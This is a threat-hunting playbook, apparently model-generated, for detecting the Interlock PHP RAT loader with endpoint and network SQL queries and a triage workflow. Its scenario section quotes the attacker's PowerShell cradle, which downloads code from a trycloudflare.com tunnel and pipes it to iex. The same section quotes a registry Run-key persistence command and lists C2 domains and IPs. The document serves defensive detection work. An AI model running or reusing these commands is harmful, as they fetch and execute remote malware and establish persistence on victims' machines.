---
analysis: A simple detection rule might alert on 'trycloudflare.com', but this hunt
  correlates that network signal with rare PHP execution paths and specific PowerShell
  loader patterns across three telemetry surfaces, providing the context needed to
  confirm a real intrusion versus a developer's test.
blind_spots:
- id: no-endpoint-telemetry
  owner: Detection Engineering
  question: Which hosts are not reporting process or network events?
  remediation: Audit agent health and ensure universal coverage across the workstation
    estate.
  requires: Complete coverage of hb_process_activity and hb_network_connection
  risk: A host running the Interlock PHP RAT without telemetry coverage will remain
    invisible to this entire hunt workflow.
- id: obfuscated-script-blocks
  owner: SOC Operations
  question: Was the PowerShell loader obfuscated to bypass command-line keywords?
  remediation: Enable PowerShell Script Block Logging (Event ID 4104) and ensure it
    is ingested into hb_script_activity.
  requires: hb_script_activity with full script_content
  risk: Attackers can encode the WebClient download or IEX call; simple LIKE matches
    on process_cmd_line will fail.
  stage: powershell-loader-execution
coverage:
- stage: powershell-loader-execution
  status: covered
  steps:
  - powershell-loader-detect
  - network-to-interlock-c2
- stage: interlock-php-rat-deployment
  status: covered
  steps:
  - scoping-weird-php
  - rare-php-execution
- reason: This stage involves compromised websites and web-injects, which belongs
    to a browser-centric or web-security hunt.
  stage: initial-access-social-engineering
  status: out_of_scope
- reason: 'Handled in the sibling hunt: interlock-reconnaissance-and-discovery.'
  stage: automated-reconnaissance
  status: out_of_scope
- reason: 'Handled in the sibling hunt: interlock-reconnaissance-and-discovery.'
  stage: hands-on-domain-discovery
  status: out_of_scope
- reason: Covered partially here for enrichment, but the full analysis of fallback
    resilience is its own series.
  stage: c2-and-fallback-communications
  status: out_of_scope
- reason: 'Handled in the sibling hunt: interlock-persistence-mechanisms.'
  stage: registry-run-key-persistence
  status: out_of_scope
- reason: Requires hb_auth_signin or RDP-specific logs not prioritized in this execution-focused
    hunt.
  stage: lateral-movement-rdp
  status: out_of_scope
guardrails:
  claims: no_unsupported
  evidence: citation_required
  missing_data: not_benign
  telemetry: untrusted
hunt:
  applicability: campaign-specific
  handoff: promote-to-detection
  justification: The Interlock ransomware group has introduced a resilient PHP-based
    variant of their RAT. Identifying this loader early prevents full network exfiltration
    and ransomware deployment.
  methodology: model-assisted
  trigger: intel-report
hypothesis: An adversary is deploying a PHP-based RAT via PowerShell web cradles,
  executing the PHP interpreter from user-writable AppData paths to evade standard
  software audits and maintain remote access.
labels:
- hunt
- attack.t1059.001
- attack.t1105
- attack.t1562.001
- attack.t1059.006
name: Interlock PHP RAT Loader and Deployment
parameters:
  c2_domains:
    default:
    - deadly-programming-attorneys-our.trycloudflare.com
    - existed-bunch-balance-councils.trycloudflare.com
    - ferrari-rolling-facilities-lounge.trycloudflare.com
    description: Known Interlock RAT C2/Tunnel domains.
    from:
      kind: article
      observed: '2025-07-14T00:00:00Z'
      ref: https://thedfirreport.com/2025/07/14/kongtuke-filefix-leads-to-new-interlock-rat-variant/
    type: list[domain]
  fallback_ips:
    default:
    - 64.95.12.71
    - 184.95.51.165
    description: Hardcoded fallback C2 IPs.
    from:
      kind: article
      observed: '2025-07-14T00:00:00Z'
      ref: https://thedfirreport.com/2025/07/14/kongtuke-filefix-leads-to-new-interlock-rat-variant/
    type: list[ip]
  lookback_days:
    default: '14'
    description: Days of history to examine.
    from:
      kind: manual
      observed: '2025-07-20T00:00:00Z'
      ref: standard-lookback
    type: number
provenance:
  authors:
  - name: Huntbase hunt generation
    org: huntbase.io
  generated:
    by: huntbase-hunt-generation
    from: https://thedfirreport.com/2025/07/14/kongtuke-filefix-leads-to-new-interlock-rat-variant/
    gates:
    - design-checks
    - dry-run
    - lint
    model: hb_google/gemini-3-flash-preview
rationale: The hunt should start by targeting all Windows workstations and servers.
  Prioritize hosts where the 'scoping-weird-php' query returns hits, then pivot to
  the PowerShell command lines.
references:
- name: "The DFIR Report \u2014 KongTuke FileFix Leads to New Interlock RAT Variant"
  url: https://thedfirreport.com/2025/07/14/kongtuke-filefix-leads-to-new-interlock-rat-variant/
related:
- hunt: interlock-reconnaissance-and-discovery
  reason: Once the RAT is deployed, it immediately initiates automated reconnaissance
    via PowerShell.
  relation: follows
- hunt: interlock-persistence-mechanisms
  reason: The RAT achieves persistence through Registry Run keys, which is a separate
    behavioral signal.
  relation: follows
scenario:
  stages:
  - name: Social Engineering Web-Inject
    observables:
    - Single-line script hidden in HTML
    - Fake captcha 'Verify you are human'
    - User instructed to open Run command and paste from clipboard
    slug: initial-access-social-engineering
    tactic: initial-access
    techniques:
    - T1189
    - T1204.001
  - name: PowerShell Loader Execution
    observables:
    - powershell.exe -ep Bypass -w H -c "schtasks /delete /tn Updater /f; $w=New-Object
      System.Net.WebClient ; $w.Headers.Add(\"User-Agent\", \"PowerShell\") ; $w.DownloadString(\"http://deadly-programming-attorneys-our.trycloudflare.com\")
      | iex"
    - deadly-programming-attorneys-our.trycloudflare.com
    slug: powershell-loader-execution
    tactic: execution
    techniques:
    - T1059.001
    - T1105
    - T1562.001
  - name: Interlock PHP RAT Deployment
    observables:
    - C:\Users\REDACTED\AppData\Roaming\php\php.exe -d extension=zip -d extension_dir=ext
      C:\Users\\AppData\Roaming\php\wefs.cfg 1
    - AppData\Roaming\php\php.exe
    - AppData\Roaming\php\wefs.cfg
    slug: interlock-php-rat-deployment
    tactic: execution
    techniques:
    - T1059
  - name: Automated System Profiling
    observables:
    - Get-NetNeighbor -AddressFamily IPv4
    - systeminfo /FO CSV
    - tasklist /svc /FO CSV
    - Get-Service
    - Get-PSDrive -PSProvider FileSystem
    - '[Security.Principal.WindowsIdentity]::GetCurrent()'
    slug: automated-reconnaissance
    tactic: discovery
    techniques:
    - T1016
    - T1082
    - T1057
    - T1007
    - T1033
    - T1083
  - name: Interactive Domain & Backup Discovery
    observables:
    - '[adsiSearcher]"(ObjectClass=computer)"'
    - 'nltest /dclist:'
    - net user %USERNAME% /domain
    - Regex matching VB|VBR|VEEA|VEEAM|BCK|BACK to find backup servers
    - whoami
    slug: hands-on-domain-discovery
    tactic: discovery
    techniques:
    - T1018
    - T1087.002
    - T1482
  - name: Cloudflare Tunnel C2
    observables:
    - existed-bunch-balance-councils.trycloudflare.com
    - ferrari-rolling-facilities-lounge.trycloudflare.com
    - galleries-physicians-psp-wv.trycloudflare.com
    - 64.95.12.71
    - 184.95.51.165
    slug: c2-and-fallback-communications
    tactic: command-and-control
    techniques:
    - T1572
    - T1102.003
  - name: Registry Run Key Persistence
    observables:
    - reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "REDACTED" /t
      REG_SZ /d ""C:\Users\REDACTED\AppData\Roaming\php\php.exe" "C:\Users\REDACTED\AppData\Roaming\php\wefs.cfg""
      /f
    slug: registry-run-key-persistence
    tactic: persistence
    techniques:
    - T1547.001
  - name: Lateral Movement via RDP
    observables:
    - RDP connections to internal hosts
    slug: lateral-movement-rdp
    tactic: lateral-movement
    techniques:
    - T1021.001
  summary: The Interlock ransomware group has introduced a PHP-based Remote Access
    Trojan (RAT) variant, delivered via the KongTuke campaign using social engineering
    and malicious PowerShell scripts. The malware establishes a command-and-control
    channel through Cloudflare Tunnels and fallback IPs, performs extensive host and
    domain reconnaissance, and maintains persistence via registry run keys to facilitate
    lateral movement through RDP.
series:
  index: 1
  slug: kongtuke-filefix-leads-to-new-interlock-rat-variant
  title: KongTuke FileFix Leads to New Interlock RAT Variant
  total: 3
severity: high
targets:
  analyst:
    name: Tier-2 analyst
    role: analyst
  endpoint:
    category: endpoint
    huntbase:
      product: hb-endpoint-control
    name: Endpoint telemetry (hb_ surfaces)
    telemetry:
    - endpoint
  hunter:
    agent: true
    name: Hunt agent
  network:
    category: network
    name: Network telemetry
    telemetry:
    - network
tlp: clear
type: investigation
---


# Interlock PHP RAT Loader and Deployment

This hunt targets the initial execution and deployment phases of the Interlock PHP RAT variant, as seen in the KongTuke/LandUpdate808 campaign. We look for the characteristic PowerShell 'web cradle' that downloads from Cloudflare tunnels and subsequently executes a portable PHP binary from the user's AppData directory. The hunt pivots between PowerShell process arguments, rare PHP binary locations, and Cloudflare C2 infrastructure to identify infected endpoints where standard detections might have been bypassed.

## scoping-weird-php
<!-- Scope hosts with non-standard PHP binaries -->
Identify hosts that have executed or currently host a PHP binary within a user profile, a common marker for this RAT's deployment.

```sqlite target=endpoint role=scoping params=(lookback_days=lookback_days)
~~~yaml
expected: Hosts running PHP from a user directory. Benign hits may include developers
  with local environments (XAMPP/WAMP), which will be baselined in the next step.
reads:
- device_hostname
- user_name
- process_path
silence: not_evidence_of_absence
source: hb_process_activity
verified: none
~~~
SELECT DISTINCT device_hostname, user_name, process_path FROM hb_process_activity WHERE (LOWER(process_name) = 'php.exe' OR LOWER(process_path) LIKE '%\php.exe') AND (LOWER(process_path) LIKE '%\users\%' OR LOWER(process_path) LIKE '%\appdata\%') AND time >= datetime('now', '-{{lookback_days}} days')
```

## powershell-loader-detect
<!-- PowerShell loader targeting Cloudflare tunnels -->
Find the specific PowerShell command line used to download and execute the Interlock RAT payload via IEX.

```sqlite target=endpoint role=detection-candidate params=(lookback_days=lookback_days)
~~~yaml
expected: PowerShell processes using WebClient to download from a tunnel URL and piping
  to IEX. This is a high-confidence indicator for the 'KongTuke' delivery mechanism.
reads:
- device_hostname
- process_cmd_line
- user_name
- time
silence: not_evidence_of_absence
source: hb_process_activity
verified: none
~~~
SELECT device_hostname, process_cmd_line, user_name, time FROM hb_process_activity WHERE LOWER(process_name) LIKE '%powershell.exe' AND LOWER(process_cmd_line) LIKE '%webclient%' AND LOWER(process_cmd_line) LIKE '%iex%' AND (LOWER(process_cmd_line) LIKE '%trycloudflare.com%' OR LOWER(process_cmd_line) LIKE '%schtasks%/delete%') AND time >= datetime('now', '-{{lookback_days}} days')
```

## parallel-investigation
<!-- Investigate prevalence and network telemetry -->
parallel:
- → rare-php-execution
- → network-to-interlock-c2
join: → triage-agent

## rare-php-execution
<!-- Fleet-wide prevalence of PHP binaries -->
Identify instances of PHP binaries that are unique to a very small number of hosts, filtering out legitimate development tools.

```sqlite target=endpoint role=baseline params=(lookback_days=lookback_days)
~~~yaml
baseline:
  compare: first_seen
  window: '{{lookback_days}}d'
expected: A binary path seen on 3 or fewer hosts. PHP is not a standard business application
  and its presence should be rare and justifiable.
prevalence:
  by: device_hostname
  key:
  - process_path
  rare_below: 3
reads:
- process_path
- device_hostname
- time
silence: not_evidence_of_absence
source: hb_process_activity
verified: none
~~~
SELECT LOWER(process_path) as path, COUNT(DISTINCT device_hostname) as hosts, MIN(time) as first_seen FROM hb_process_activity WHERE (LOWER(process_name) = 'php.exe' OR LOWER(process_path) LIKE '%\php.exe') AND time >= datetime('now', '-{{lookback_days}} days') GROUP BY 1 HAVING hosts <= 3
```

## network-to-interlock-c2
<!-- Connections to fallback IPs or tunnel domains -->
Capture any network telemetry originating from the host that matches the report's C2 infrastructure.

```sqlite target=network role=enrichment params=(lookback_days=lookback_days, fallback_ips=fallback_ips, c2_domains=c2_domains)
~~~yaml
expected: Outbound TCP/UDP activity to the specific IPs or Cloudflare subdomains.
  While trycloudflare.com is a shared service, its appearance alongside the other
  indicators is high-weight evidence.
reads:
- device_hostname
- dst_endpoint_ip
- dst_endpoint_hostname
- process_name
- time
silence: not_evidence_of_absence
source: hb_network_connection
verified: none
~~~
SELECT device_hostname, dst_endpoint_ip, dst_endpoint_hostname, process_name, time FROM hb_network_connection WHERE (instr(',' || '{{fallback_ips}}' || ',', ',' || dst_endpoint_ip || ',') > 0 OR instr(',' || '{{c2_domains}}' || ',', ',' || LOWER(dst_endpoint_hostname) || ',') > 0 OR LOWER(dst_endpoint_hostname) LIKE '%.trycloudflare.com') AND time >= datetime('now', '-{{lookback_days}} days')
```

## triage-agent
<!-- Weigh Interlock RAT indicators -->
```agent target=hunter
cite: required
context:
- scoping-weird-php
- powershell-loader-detect
- rare-php-execution
- network-to-interlock-c2
max_iterations: 4
objective: 'Determine if the observed process and network activity matches the Interlock
  RAT deployment pattern: PowerShell loader -> PHP in AppData -> trycloudflare/C2
  connection.'
success_criteria: A per-host verdict of malicious | suspicious | benign, citing specific
  rows for the loader command or rare binary path.
tools:
- endpoint
- network
```

## decision-logic
<!-- Route on triage result -->
if~: "the agent finds malicious activity correlating the PowerShell loader and the PHP deployment on at least one host" (confidence: high, judge=hunter)
then: → isolate-endpoint
indeterminate: → manual-review
unavailable: → manual-review (blind_spot: no-endpoint-telemetry)
else: → close-out

## isolate-endpoint
<!-- Isolate host and collect artifacts -->
```action target=endpoint
~~~yaml
approval: required
~~~
Isolate the host immediately. Before remediation, collect the PHP binary and the .cfg file found in AppData\Roaming\php (or similar) for forensic analysis.
```
→ manual-review

## manual-review
<!-- Manual forensic review -->
```manual target=analyst
Confirm the loader source (e.g., browser history, clipboard logs if available). Review tasklist or NetNeighbor activity on the same host to determine if the automated recon phase completed.
```
→ end

## close-out
<!-- Close hunt and tune -->
```manual target=analyst
Document why the findings were benign (e.g., authorized developer tools) and consider adding exclusions for those specific paths if they are legitimate.
```
→ end
